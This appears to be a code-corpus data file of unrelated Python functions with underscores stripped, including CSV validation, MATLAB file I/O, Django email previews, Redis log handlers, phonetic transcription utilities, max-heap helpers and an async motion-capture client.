def apply value checks ( self , i , r , summarize = False , report unexpected exceptions = True , context = None ) : for field name , check , code , message , modulus in self . value checks : if i % modulus == 0 : # support sampling fi = self . field names . index ( field name ) if fi < len ( r ) : # only apply checks if there is a value value = r [ fi ] try : check ( value ) except Value Error : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'column' ] = fi + 1 p [ 'field' ] = field name p [ 'value' ] = value p [ 'record' ] = r if context is not None : p [ 'context' ] = context yield p except Exception as e : if report unexpected exceptions : p = { 'code' : UNEXPECTED EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED EXCEPTION ] % ( e . class . name , e ) p [ 'row' ] = i + 1 p [ 'column' ] = fi + 1 p [ 'field' ] = field name p [ 'value' ] = value p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( check . name , check . doc ) if context is not None : p [ 'context' ] = context yield p
def apply header checks ( self , i , r , summarize = False , context = None ) : for code , message in self . header checks : if tuple ( r ) != self . field names : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = tuple ( r ) p [ 'missing' ] = set ( self . field names ) - set ( r ) p [ 'unexpected' ] = set ( r ) - set ( self . field names ) if context is not None : p [ 'context' ] = context yield p
def apply record length checks ( self , i , r , summarize = False , context = None ) : for code , message , modulus in self . record length checks : if i % modulus == 0 : # support sampling if len ( r ) != len ( self . field names ) : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'length' ] = len ( r ) if context is not None : p [ 'context' ] = context yield p
def apply value predicates ( self , i , r , summarize = False , report unexpected exceptions = True , context = None ) : for field name , predicate , code , message , modulus in self . value predicates : if i % modulus == 0 : # support sampling fi = self . field names . index ( field name ) if fi < len ( r ) : # only apply predicate if there is a value value = r [ fi ] try : valid = predicate ( value ) if not valid : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'column' ] = fi + 1 p [ 'field' ] = field name p [ 'value' ] = value p [ 'record' ] = r if context is not None : p [ 'context' ] = context yield p except Exception as e : if report unexpected exceptions : p = { 'code' : UNEXPECTED EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED EXCEPTION ] % ( e . class . name , e ) p [ 'row' ] = i + 1 p [ 'column' ] = fi + 1 p [ 'field' ] = field name p [ 'value' ] = value p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( predicate . name , predicate . doc ) if context is not None : p [ 'context' ] = context yield p
def apply record checks ( self , i , r , summarize = False , report unexpected exceptions = True , context = None ) : for check , modulus in self . record checks : if i % modulus == 0 : # support sampling rdict = self . as dict ( r ) try : check ( rdict ) except Record Error as e : code = e . code if e . code is not None else RECORD CHECK FAILED p = { 'code' : code } if not summarize : message = e . message if e . message is not None else MESSAGES [ RECORD CHECK FAILED ] p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r if context is not None : p [ 'context' ] = context if e . details is not None : p [ 'details' ] = e . details yield p except Exception as e : if report unexpected exceptions : p = { 'code' : UNEXPECTED EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED EXCEPTION ] % ( e . class . name , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( check . name , check . doc ) if context is not None : p [ 'context' ] = context yield p
def apply record predicates ( self , i , r , summarize = False , report unexpected exceptions = True , context = None ) : for predicate , code , message , modulus in self . record predicates : if i % modulus == 0 : # support sampling rdict = self . as dict ( r ) try : valid = predicate ( rdict ) if not valid : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r if context is not None : p [ 'context' ] = context yield p except Exception as e : if report unexpected exceptions : p = { 'code' : UNEXPECTED EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED EXCEPTION ] % ( e . class . name , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( predicate . name , predicate . doc ) if context is not None : p [ 'context' ] = context yield p
def apply unique checks ( self , i , r , unique sets , summarize = False , context = None ) : for key , code , message in self . unique checks : value = None values = unique sets [ key ] if isinstance ( key , basestring ) : # assume key is a field name fi = self . field names . index ( key ) if fi >= len ( r ) : continue value = r [ fi ] else : # assume key is a list or tuple, i.e., compound key value = [ ] for f in key : fi = self . field names . index ( f ) if fi >= len ( r ) : break value . append ( r [ fi ] ) value = tuple ( value ) # enable hashing if value in values : p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'key' ] = key p [ 'value' ] = value if context is not None : p [ 'context' ] = context yield p values . add ( value )
def apply each methods ( self , i , r , summarize = False , report unexpected exceptions = True , context = None ) : for a in dir ( self ) : if a . startswith ( 'each' ) : rdict = self . as dict ( r ) f = getattr ( self , a ) try : f ( rdict ) except Exception as e : if report unexpected exceptions : p = { 'code' : UNEXPECTED EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED EXCEPTION ] % ( e . class . name , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( f . name , f . doc ) if context is not None : p [ 'context' ] = context yield p
def apply assert methods ( self , i , r , summarize = False , report unexpected exceptions = True , context = None ) : for a in dir ( self ) : if a . startswith ( 'assert' ) : rdict = self . as dict ( r ) f = getattr ( self , a ) try : f ( rdict ) except Assertion Error as e : code = ASSERT CHECK FAILED message = MESSAGES [ ASSERT CHECK FAILED ] if len ( e . args ) > 0 : custom = e . args [ 0 ] if isinstance ( custom , ( list , tuple ) ) : if len ( custom ) > 0 : code = custom [ 0 ] if len ( custom ) > 1 : message = custom [ 1 ] else : code = custom p = { 'code' : code } if not summarize : p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r if context is not None : p [ 'context' ] = context yield p except Exception as e : if report unexpected exceptions : p = { 'code' : UNEXPECTED EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED EXCEPTION ] % ( e . class . name , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( f . name , f . doc ) if context is not None : p [ 'context' ] = context yield p
def apply check methods ( self , i , r , summarize = False , report unexpected exceptions = True , context = None ) : for a in dir ( self ) : if a . startswith ( 'check' ) : rdict = self . as dict ( r ) f = getattr ( self , a ) try : f ( rdict ) except Record Error as e : code = e . code if e . code is not None else RECORD CHECK FAILED p = { 'code' : code } if not summarize : message = e . message if e . message is not None else MESSAGES [ RECORD CHECK FAILED ] p [ 'message' ] = message p [ 'row' ] = i + 1 p [ 'record' ] = r if context is not None : p [ 'context' ] = context if e . details is not None : p [ 'details' ] = e . details yield p except Exception as e : if report unexpected exceptions : p = { 'code' : UNEXPECTED EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED EXCEPTION ] % ( e . class . name , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( f . name , f . doc ) if context is not None : p [ 'context' ] = context yield p
def apply skips ( self , i , r , summarize = False , report unexpected exceptions = True , context = None ) : for skip in self . skips : try : result = skip ( r ) if result is True : yield True except Exception as e : if report unexpected exceptions : p = { 'code' : UNEXPECTED EXCEPTION } if not summarize : p [ 'message' ] = MESSAGES [ UNEXPECTED EXCEPTION ] % ( e . class . name , e ) p [ 'row' ] = i + 1 p [ 'record' ] = r p [ 'exception' ] = e p [ 'function' ] = '%s: %s' % ( skip . name , skip . doc ) if context is not None : p [ 'context' ] = context yield p
def as dict ( self , r ) : d = dict ( ) for i , f in enumerate ( self . field names ) : d [ f ] = r [ i ] if i < len ( r ) else None return d
def create validator ( ) : field names = ( 'study id' , 'patient id' , 'gender' , 'age years' , 'age months' , 'date inclusion' ) validator = CSV Validator ( field names ) # basic header and record length checks validator . add header check ( 'EX1' , 'bad header' ) validator . add record length check ( 'EX2' , 'unexpected record length' ) # some simple value checks validator . add value check ( 'study id' , int , 'EX3' , 'study id must be an integer' ) validator . add value check ( 'patient id' , int , 'EX4' , 'patient id must be an integer' ) validator . add value check ( 'gender' , enumeration ( 'M' , 'F' ) , 'EX5' , 'invalid gender' ) validator . add value check ( 'age years' , number range inclusive ( 0 , 120 , int ) , 'EX6' , 'invalid age in years' ) validator . add value check ( 'date inclusion' , datetime string ( '%Y-%m-%d' ) , 'EX7' , 'invalid date' ) # a more complicated record check def check age variables ( r ) : age years = int ( r [ 'age years' ] ) age months = int ( r [ 'age months' ] ) valid = ( age months >= age years * 12 and age months % age years < 12 ) if not valid : raise Record Error ( 'EX8' , 'invalid age variables' ) validator . add record check ( check age variables ) return validator
def read header ( fd , endian ) : flag class , nzmax = read elements ( fd , endian , [ 'mi UINT32' ] ) header = { 'mclass' : flag class & 0x0FF , 'is logical' : ( flag class >> 9 & 1 ) == 1 , 'is global' : ( flag class >> 10 & 1 ) == 1 , 'is complex' : ( flag class >> 11 & 1 ) == 1 , 'nzmax' : nzmax } header [ 'dims' ] = read elements ( fd , endian , [ 'mi INT32' ] ) header [ 'n dims' ] = len ( header [ 'dims' ] ) if header [ 'n dims' ] != 2 : raise Parse Error ( 'Only matrices with dimension 2 are supported.' ) header [ 'name' ] = read elements ( fd , endian , [ 'mi INT8' ] , is name = True ) return header
def eof ( fd ) : b = fd . read ( 1 ) end = len ( b ) == 0 if not end : curpos = fd . tell ( ) fd . seek ( curpos - 1 ) return end
def write var data ( fd , data ) : # write array data elements (size info) fd . write ( struct . pack ( 'b3x I' , etypes [ 'mi MATRIX' ] [ 'n' ] , len ( data ) ) ) # write the data fd . write ( data )
def write compressed var array ( fd , array , name ) : bd = Bytes IO ( ) write var array ( bd , array , name ) data = zlib . compress ( bd . getvalue ( ) ) bd . close ( ) # write array data elements (size info) fd . write ( struct . pack ( 'b3x I' , etypes [ 'mi COMPRESSED' ] [ 'n' ] , len ( data ) ) ) # write the compressed data fd . write ( data )
def write numeric array ( fd , header , array ) : # make a memory file for writing array data bd = Bytes IO ( ) # write matrix header to memory file write var header ( bd , header ) if not isinstance ( array , basestring ) and header [ 'dims' ] [ 0 ] > 1 : # list array data in column major order array = list ( chain . from iterable ( izip ( * array ) ) ) # write matrix data to memory file write elements ( bd , header [ 'mtp' ] , array ) # write the variable to disk file data = bd . getvalue ( ) bd . close ( ) write var data ( fd , data )
def raise for status ( self ) : if not self . status : return error = find exception by code ( self . status ) message = None screen = None stacktrace = None if isinstance ( self . value , str ) : message = self . value elif isinstance ( self . value , dict ) : message = self . value . get ( 'message' , None ) screen = self . value . get ( 'screen' , None ) stacktrace = self . value . get ( 'stacktrace' , None ) raise Web Driver Exception ( error , message , screen , stacktrace )
def fluent ( func ) : @ wraps ( func ) def fluent interface ( instance , * args , * * kwargs ) : ret = func ( instance , * args , * * kwargs ) if ret is not None : return ret return instance return fluent interface
def check unused args ( self , used args , args , kwargs ) : for k , v in kwargs . items ( ) : if k in used args : self . used kwargs . update ( { k : v } ) else : self . unused kwargs . update ( { k : v } )
def vformat ( self , format string , args , kwargs ) : self . used kwargs = { } self . unused kwargs = { } return super ( Memorize Formatter , self ) . vformat ( format string , args , kwargs )
def Plug In ( self ) : ids = self . available ids ( ) if len ( ids ) == 0 : raise Max Inputs Reached Error ( 'Max Inputs Reached' ) self . id = ids [ 0 ] xinput . Plug In ( self . id ) while self . id in self . available ids ( ) : pass
def Un Plug ( self , force = False ) : if force : xinput . Un Plug Force ( c uint ( self . id ) ) else : xinput . Un Plug ( c uint ( self . id ) ) while self . id not in self . available ids ( ) : if self . id == 0 : break
def main ( ) : import time print ( 'Testing controller in position 1:' ) print ( 'Running 3 x 3 seconds tests' ) # Initialise Controller con = r Controller ( 1 ) # Loop printing controller state and buttons held for i in range ( 3 ) : print ( 'Waiting...' ) time . sleep ( 2.5 ) print ( 'State: ' , con . gamepad ) print ( 'Buttons: ' , con . buttons ) time . sleep ( 0.5 ) print ( 'Done!' )
def buttons ( self ) : return [ name for name , value in r Controller . buttons . items ( ) if self . gamepad . w Buttons & value == value ]
def maybe decode header ( header ) : value , encoding = decode header ( header ) [ 0 ] if encoding : return value . decode ( encoding ) else : return value
def autodiscover ( ) : from django . conf import settings for application in settings . INSTALLED APPS : module = import module ( application ) if module has submodule ( module , 'emails' ) : emails = import module ( '%s.emails' % application ) try : import module ( '%s.emails.previews' % application ) except Import Error : # Only raise the exception if this module contains previews and # there was a problem importing them. (An emails module that # does not contain previews is not an error.) if module has submodule ( emails , 'previews' ) : raise
def register ( self , cls ) : preview = cls ( site = self ) logger . debug ( 'Registering %r with %r' , preview , self ) index = self . previews . setdefault ( preview . module , { } ) index [ cls . name ] = preview
def detail view ( self , request , module , preview ) : try : preview = self . previews [ module ] [ preview ] except Key Error : raise Http404 # The provided module/preview does not exist in the index. return preview . detail view ( request )
def url ( self ) : return reverse ( '%s:detail' % URL NAMESPACE , kwargs = { 'module' : self . module , 'preview' : type ( self ) . name , } )
def detail view ( self , request ) : context = { 'preview' : self , } kwargs = { } if self . form class : if request . GET : form = self . form class ( data = request . GET ) else : form = self . form class ( ) context [ 'form' ] = form if not form . is bound or not form . is valid ( ) : return render ( request , 'mailviews/previews/detail.html' , context ) kwargs . update ( form . get message view kwargs ( ) ) message view = self . get message view ( request , * * kwargs ) message = message view . render to message ( ) raw = message . message ( ) headers = Ordered Dict ( ( header , maybe decode header ( raw [ header ] ) ) for header in self . headers ) context . update ( { 'message' : message , 'subject' : message . subject , 'body' : message . body , 'headers' : headers , 'raw' : raw . as string ( ) , } ) alternatives = getattr ( message , 'alternatives' , [ ] ) try : html = next ( alternative [ 0 ] for alternative in alternatives if alternative [ 1 ] == 'text/html' ) context . update ( { 'html' : html , 'escaped html' : b64encode ( html . encode ( 'utf-8' ) ) , } ) except Stop Iteration : pass return render ( request , self . template name , context )
def execute from command line ( argv = None ) : parser = argparse . Argument Parser ( description = doc ) parser . add argument ( '--monitors-dir' , default = MONITORS DIR ) parser . add argument ( '--alerts-dir' , default = ALERTS DIR ) parser . add argument ( '--config' , default = SMA INI FILE ) parser . add argument ( '--warning' , help = 'set logging to warning' , action = 'store const' , dest = 'loglevel' , const = logging . WARNING , default = logging . INFO ) parser . add argument ( '--quiet' , help = 'set logging to ERROR' , action = 'store const' , dest = 'loglevel' , const = logging . ERROR , default = logging . INFO ) parser . add argument ( '--debug' , help = 'set logging to DEBUG' , action = 'store const' , dest = 'loglevel' , const = logging . DEBUG , default = logging . INFO ) parser . add argument ( '--verbose' , help = 'set logging to COMM' , action = 'store const' , dest = 'loglevel' , const = 5 , default = logging . INFO ) parser . sub = parser . add subparsers ( ) parse service = parser . sub . add parser ( 'service' , help = 'Run SMA as service (daemon).' ) parse service . set defaults ( which = 'service' ) parse oneshot = parser . sub . add parser ( 'one-shot' , help = 'Run SMA once and exit' ) parse oneshot . set defaults ( which = 'one-shot' ) parse alerts = parser . sub . add parser ( 'alerts' , help = 'Alerts options.' ) parse alerts . set defaults ( which = 'alerts' ) parse alerts . add argument ( '--test' , help = 'Test alert' , action = 'store true' ) parse alerts . add argument ( 'alert section' , nargs = '?' , help = 'Alert section to see' ) parse results = parser . sub . add parser ( 'results' , help = 'Monitors results' ) parse results . set defaults ( which = 'results' ) parser . set default subparser ( 'one-shot' ) args = parser . parse args ( argv [ 1 : ] ) create logger ( 'sma' , args . loglevel ) if not getattr ( args , 'which' , None ) or args . which == 'one-shot' : sma = SMA ( args . monitors dir , args . alerts dir , args . config ) sma . evaluate and alert ( ) elif args . which == 'service' : sma = SMA Service ( args . monitors dir , args . alerts dir , args . config ) sma . start ( ) elif args . which == 'alerts' and args . test : sma = SMA ( args . monitors dir , args . alerts dir , args . config ) sma . alerts . test ( ) elif args . which == 'results' : print ( SMA ( args . monitors dir , args . alerts dir , args . config ) . results )
def emit ( self , record ) : try : self . redis client . publish ( self . channel , self . format ( record ) ) except redis . Redis Error : pass
def emit ( self , record ) : try : if self . max messages : p = self . redis client . pipeline ( ) p . rpush ( self . key , self . format ( record ) ) p . ltrim ( self . key , - self . max messages , - 1 ) p . execute ( ) else : self . redis client . rpush ( self . key , self . format ( record ) ) except redis . Redis Error : pass
def require template debug ( f ) : def ( * args , * * kwargs ) : TEMPLATE DEBUG = getattr ( settings , 'TEMPLATE DEBUG' , False ) return f ( * args , * * kwargs ) if TEMPLATE DEBUG else '' return
def pydevd ( context ) : global pdevd not available if pdevd not available : return '' try : import pydevd except Import Error : pdevd not available = True return '' render = lambda s : template . Template ( s ) . render ( context ) availables = get variables ( context ) for var in availables : locals ( ) [ var ] = context [ var ] #catch the case where no client is listening try : pydevd . settrace ( ) except socket . error : pdevd not available = True return ''
def flatten ( iterable ) : for i in iterable : if isinstance ( i , Iterable ) and not isinstance ( i , string types ) : for sub i in flatten ( i ) : yield sub i else : yield i
def parse log messages ( self , text ) : regex = r"commit ([0-9a-f]+)\n Author: (.*?)\n\n(.*?)(?:\n\n|$)" messages = re . findall ( regex , text , re . DOTALL ) parsed = [ ] for commit , author , message in messages : parsed . append ( ( commit [ : 10 ] , re . sub ( r"\s*<.*?>" , "" , author ) , # Remove email address if present message . strip ( ) ) ) return parsed
def determine paths ( self , package name = None , create package dir = False , dry run = False ) : # Give preference to the environment variable here as it will not  # derefrence sym links self . project dir = Path ( os . getenv ( 'PWD' ) or os . getcwd ( ) ) # Try and work out the project name distribution = self . get distribution ( ) if distribution : # Get name from setup.py self . project name = distribution . get name ( ) else : # ...failing that, use the current directory name self . project name = self . project dir . name # Descend into the 'src' directory to find the package  # if necessary if os . path . isdir ( self . project dir / "src" ) : package search dir = self . project dir / "src" else : package search dir = self . project dir created package dir = False if not package name : # Lets try and work out the package name from the project name package name = self . project name . replace ( "-" , " " ) # Now do some fuzzy matching def get matches ( name ) : possibles = [ n for n in os . listdir ( package search dir ) if os . path . isdir ( package search dir / n ) ] return difflib . get close matches ( name , possibles , n = 1 , cutoff = 0.8 ) close = get matches ( package name ) # If no matches, try removing the first part of the package name # (e.g. django-guardian becomes guardian) if not close and " " in package name : short package name = " " . join ( package name . split ( " " ) [ 1 : ] ) close = get matches ( short package name ) if not close : if create package dir : package dir = package search dir / package name # Gets set to true even during dry run created package dir = True if not dry run : print ( "Creating package directory at %s" % package dir ) os . mkdir ( package dir ) else : print ( "Would have created package directory at %s" % package dir ) else : raise Command Error ( "Could not guess the package name. Specify it using --name." ) else : package name = close [ 0 ] self . package name = package name self . package dir = package search dir / package name if not os . path . exists ( self . package dir ) and not created package dir : raise Command Error ( "Package directory did not exist at %s. Perhaps specify it using --name" % self . package dir )
def get sha ( a file , settings = None ) : if settings : error = settings [ "error" ] else : error = ERROR FN try : BLOCKSIZE = 65536 hasher = hashlib . sha1 ( ) with io . open ( a file , "rb" ) as fh : buf = fh . read ( BLOCKSIZE ) while len ( buf ) > 0 : hasher . update ( buf ) buf = fh . read ( BLOCKSIZE ) the hash = hasher . hexdigest ( ) except IO Error : errmes = "File '{}' could not be read! Exiting!" . format ( a file ) error ( errmes ) sys . exit ( 1 ) except : errmes = "Unspecified error returning sha1 hash. Exiting!" error ( errmes ) sys . exit ( 1 ) return the hash
def find standard sakefile ( settings ) : error = settings [ "error" ] if settings [ "customsake" ] : custom = settings [ "customsake" ] if not os . path . isfile ( custom ) : error ( "Specified sakefile '{}' doesn't exist" , custom ) sys . exit ( 1 ) return custom # no custom specified, going over defaults in order for name in [ "Sakefile" , "Sakefile.yaml" , "Sakefile.yml" ] : if os . path . isfile ( name ) : return name error ( "Error: there is no Sakefile to read" ) sys . exit ( 1 )
def itertable ( table ) : for item in table : res = { k . lower ( ) : nfd ( v ) if isinstance ( v , text type ) else v for k , v in item . items ( ) } for extra in res . pop ( 'extra' , [ ] ) : k , , v = extra . partition ( ':' ) res [ k . strip ( ) ] = v . strip ( ) yield res
def make package ( args ) : # pragma: no cover from lingpy . sequence . sound classes import token2class from lingpy . data import Model columns = [ 'LATEX' , 'FEATURES' , 'SOUND' , 'IMAGE' , 'COUNT' , 'NOTE' ] bipa = Transcription System ( 'bipa' ) for src , rows in args . repos . iter sources ( type = 'td' ) : args . log . info ( 'Transcription Data {0} ...' . format ( src [ 'NAME' ] ) ) uritemplate = URI Template ( src [ 'URITEMPLATE' ] ) if src [ 'URITEMPLATE' ] else None out = [ [ 'BIPA GRAPHEME' , 'CLTS NAME' , 'GENERATED' , 'EXPLICIT' , 'GRAPHEME' , 'URL' ] + columns ] graphemes = set ( ) for row in rows : if row [ 'GRAPHEME' ] in graphemes : args . log . warn ( 'skipping duplicate grapheme: {0}' . format ( row [ 'GRAPHEME' ] ) ) continue graphemes . add ( row [ 'GRAPHEME' ] ) if not row [ 'BIPA' ] : bipa sound = bipa [ row [ 'GRAPHEME' ] ] explicit = '' else : bipa sound = bipa [ row [ 'BIPA' ] ] explicit = '+' generated = '+' if bipa sound . generated else '' if is valid sound ( bipa sound , bipa ) : bipa grapheme = bipa sound . s bipa name = bipa sound . name else : bipa grapheme , bipa name = '<NA>' , '<NA>' url = uritemplate . expand ( * * row ) if uritemplate else row . get ( 'URL' , '' ) out . append ( [ bipa grapheme , bipa name , generated , explicit , row [ 'GRAPHEME' ] , url ] + [ row . get ( c , '' ) for c in columns ] ) found = len ( [ o for o in out if o [ 0 ] != '<NA>' ] ) args . log . info ( '... {0} of {1} graphemes found ({2:.0f}%)' . format ( found , len ( out ) , found / len ( out ) * 100 ) ) with Unicode Writer ( pkg path ( 'transcriptiondata' , '{0}.tsv' . format ( src [ 'NAME' ] ) ) , delimiter = '\t' ) as writer : writer . writerows ( out ) count = 0 with Unicode Writer ( pkg path ( 'soundclasses' , 'lingpy.tsv' ) , delimiter = '\t' ) as writer : writer . writerow ( [ 'CLTS NAME' , 'BIPA GRAPHEME' ] + SOUNDCLASS SYSTEMS ) for grapheme , sound in sorted ( bipa . sounds . items ( ) ) : if not sound . alias : writer . writerow ( [ sound . name , grapheme ] + [ token2class ( grapheme , Model ( cls ) ) for cls in SOUNDCLASS SYSTEMS ] ) count += 1 args . log . info ( 'Sound Classes: {0} written to file.' . format ( count ) )
def is valid sound ( sound , ts ) : if isinstance ( sound , ( Marker , Unknown Sound ) ) : return False s1 = ts [ sound . name ] s2 = ts [ sound . s ] return s1 . name == s2 . name and s1 . s == s2 . s
def normalize ( self , string ) : return '' . join ( [ self . normalize . get ( x , x ) for x in nfd ( string ) ] )
def from name ( self , string ) : components = string . split ( ' ' ) if frozenset ( components ) in self . features : return self . features [ frozenset ( components ) ] rest , sound class = components [ : - 1 ] , components [ - 1 ] if sound class in [ 'diphthong' , 'cluster' ] : if string . startswith ( 'from ' ) and 'to ' in string : extension = { 'diphthong' : 'vowel' , 'cluster' : 'consonant' } [ sound class ] string = ' ' . join ( string . split ( ' ' ) [ 1 : - 1 ] ) from , to = string . split ( ' to ' ) v1 , v2 = frozenset ( from . split ( ' ' ) + [ extension ] ) , frozenset ( to . split ( ' ' ) + [ extension ] ) if v1 in self . features and v2 in self . features : s1 , s2 = ( self . features [ v1 ] , self . features [ v2 ] ) if sound class == 'diphthong' : return Diphthong . from sounds ( s1 + s2 , s1 , s2 , self ) # noqa: F405 else : return Cluster . from sounds ( s1 + s2 , s1 , s2 , self ) # noqa: F405 else : # try to generate the sounds if they are not there s1 , s2 = self . from name ( from + ' ' + extension ) , self . from name ( to + ' ' + extension ) if not ( isinstance ( s1 , Unknown Sound ) or isinstance ( s2 , Unknown Sound ) ) : # noqa: F405 if sound class == 'diphthong' : return Diphthong . from sounds ( # noqa: F405 s1 + s2 , s1 , s2 , self ) return Cluster . from sounds ( s1 + s2 , s1 , s2 , self ) # noqa: F405 raise Value Error ( 'components could not be found in system' ) else : raise Value Error ( 'name string is erroneously encoded' ) if sound class not in self . sound classes : raise Value Error ( 'no sound class specified' ) args = { self . feature values . get ( comp , '?' ) : comp for comp in rest } if '?' in args : raise Value Error ( 'string contains unknown features' ) args [ 'grapheme' ] = '' args [ 'ts' ] = self sound = self . sound classes [ sound class ] ( * * args ) if sound . featureset not in self . features : sound . generated = True return sound return self . features [ sound . featureset ]
def iteration ( self ) : i = 0 conv = np . inf old conv = - np . inf conv list = [ ] m = self . original # If the original data input is in pandas Data Frame format if isinstance ( self . original , pd . Data Frame ) : ipfn method = self . ipfn df elif isinstance ( self . original , np . ndarray ) : ipfn method = self . ipfn np self . original = self . original . astype ( 'float64' ) else : print ( 'Data input instance not recognized' ) sys . exit ( 0 ) while ( ( i <= self . max itr and conv > self . conv rate ) and ( i <= self . max itr and abs ( conv - old conv ) > self . rate tolerance ) ) : old conv = conv m , conv = ipfn method ( m , self . aggregates , self . dimensions , self . weight col ) conv list . append ( conv ) i += 1 converged = 1 if i <= self . max itr : if not conv > self . conv rate : print ( 'ipfn converged: convergence rate below threshold' ) elif not abs ( conv - old conv ) > self . rate tolerance : print ( 'ipfn converged: convergence rate not updating or below rate tolerance' ) else : print ( 'Maximum iterations reached' ) converged = 0 # Handle the verbose if self . verbose == 0 : return m elif self . verbose == 1 : return m , converged elif self . verbose == 2 : return m , converged , pd . Data Frame ( { 'iteration' : range ( i ) , 'conv' : conv list } ) . set index ( 'iteration' ) else : print ( 'wrong verbose input, return None' ) sys . exit ( 0 )
def get days span ( self , month index ) : is first month = month index == 0 is last month = month index == self . len ( ) - 1 y = int ( self . start date . year + ( self . start date . month + month index ) / 13 ) m = int ( ( self . start date . month + month index ) % 12 or 12 ) total = calendar . monthrange ( y , m ) [ 1 ] if is first month and is last month : return ( self . end date - self . start date ) . days + 1 else : if is first month : return total - self . start date . day + 1 elif is last month : return self . end date . day else : return total
def calculate period ( self , vals ) : if len ( vals ) < 4 : return None if self . firmware [ 'major' ] < 16 : return ( ( vals [ 3 ] << 24 ) | ( vals [ 2 ] << 16 ) | ( vals [ 1 ] << 8 ) | vals [ 0 ] ) / 12e6 else : return self . calculate float ( vals )
def start ( self ) : self . receiver = self . Receiver ( self . read , self . write , self . send lock , self . senders , self . frames received , callback = self . receive callback , fcs nack = self . fcs nack , ) self . receiver . start ( )
def stop ( self ) : if self . receiver != None : self . receiver . join ( ) for s in self . senders . values ( ) : s . join ( )
def replace ( self , * * k ) : if self . date != 'infinity' : return Date ( self . date . replace ( * * k ) ) else : return Date ( 'infinity' )
def validate token ( self , request , consumer , token ) : oauth server , oauth request = oauth provider . utils . initialize server request ( request ) oauth server . verify request ( oauth request , consumer , token )
def check nonce ( self , request , oauth request ) : oauth nonce = oauth request [ 'oauth nonce' ] oauth timestamp = oauth request [ 'oauth timestamp' ] return check nonce ( request , oauth request , oauth nonce , oauth timestamp )
def deliveries ( self ) : key = make key ( event = self . object . event , owner name = self . object . owner . username , identifier = self . object . identifier ) return redis . lrange ( key , 0 , 20 )
def event choices ( events ) : if events is None : msg = "Please add some events in settings.WEBHOOK EVENTS." raise Improperly Configured ( msg ) try : choices = [ ( x , x ) for x in events ] except Type Error : """ Not a valid iterator, so we raise an exception """ msg = "settings.WEBHOOK EVENTS must be an iterable object." raise Improperly Configured ( msg ) return choices
def check Serial ( self ) : for item in self . rx Serial ( self . TUN . tun . mtu ) : # print("about to send: {0}".format(item)) try : self . TUN . tun . write ( item ) except pytun . Error as error : print ( "pytun error writing: {0}" . format ( item ) ) print ( error )
def value from datadict ( self , * args , * * kwargs ) : value = super ( Rich Text Widget , self ) . value from datadict ( * args , * * kwargs ) if value is not None : value = self . get sanitizer ( ) ( value ) return value
def heappop max ( heap ) : lastelt = heap . pop ( ) # raises appropriate Index Error if heap is empty if heap : returnitem = heap [ 0 ] heap [ 0 ] = lastelt siftup max ( heap , 0 ) return returnitem return lastelt
def heapreplace max ( heap , item ) : returnitem = heap [ 0 ] # raises appropriate Index Error if heap is empty heap [ 0 ] = item siftup max ( heap , 0 ) return returnitem
def heappush max ( heap , item ) : heap . append ( item ) siftdown max ( heap , 0 , len ( heap ) - 1 )
def heappushpop max ( heap , item ) : if heap and heap [ 0 ] > item : # if item >= heap[0], it will be popped immediately after pushed item , heap [ 0 ] = heap [ 0 ] , item siftup max ( heap , 0 ) return item
def validate response ( expected responses ) : def internal decorator ( function ) : @ wraps ( function ) async def wrapper ( * args , * * kwargs ) : response = await function ( * args , * * kwargs ) for expected response in expected responses : if response . startswith ( expected response ) : return response raise QRT Command Exception ( "Expected %s but got %s" % ( expected responses , response ) ) return wrapper return internal decorator
async def qtm version ( self ) : return await asyncio . wait for ( self . protocol . send command ( "qtmversion" ) , timeout = self . timeout )
async def stream frames stop ( self ) : self . protocol . set on packet ( None ) cmd = "streamframes stop" await self . protocol . send command ( cmd , callback = False )
async def release control ( self ) : cmd = "releasecontrol" return await asyncio . wait for ( self . protocol . send command ( cmd ) , timeout = self . timeout )
async def start ( self , rtfromfile = False ) : cmd = "start" + ( " rtfromfile" if rtfromfile else "" ) return await asyncio . wait for ( self . protocol . send command ( cmd ) , timeout = self . timeout )
async def set qtm event ( self , event = None ) : cmd = "event%s" % ( "" if event is None else " " + event ) return await asyncio . wait for ( self . protocol . send command ( cmd ) , timeout = self . timeout )
def data received ( self , data ) : self . received data += data h size = R Theader . size data = self . received data size , type = R Theader . unpack from ( data , 0 ) while len ( data ) >= size : self . parse received ( data [ h size : size ] , type ) data = data [ size : ] if len ( data ) < h size : break size , type = R Theader . unpack from ( data , 0 ) self . received data = data
